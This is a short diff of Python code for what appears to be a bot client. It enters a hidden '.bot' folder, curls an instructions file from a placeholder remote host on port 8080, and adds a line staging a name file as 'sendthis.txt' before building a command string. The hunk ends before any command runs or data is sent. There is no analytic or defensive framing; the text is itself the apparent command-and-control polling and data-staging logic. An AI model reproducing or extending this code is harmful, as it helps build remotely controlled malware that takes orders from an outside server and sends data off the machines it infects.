@@ -47,6 +47,7 @@ def instructions():
 	dir = os.path.join('./','.bot')
 	os.chdir(dir)
 	os.system('curl <IP>:8080/instructions.txt > response.txt')
+	os.system('cat name.txt > sendthis.txt')
 	with open('response.txt') as input_file:
 		myname = open('name.txt', 'r').read()
 		command = ''
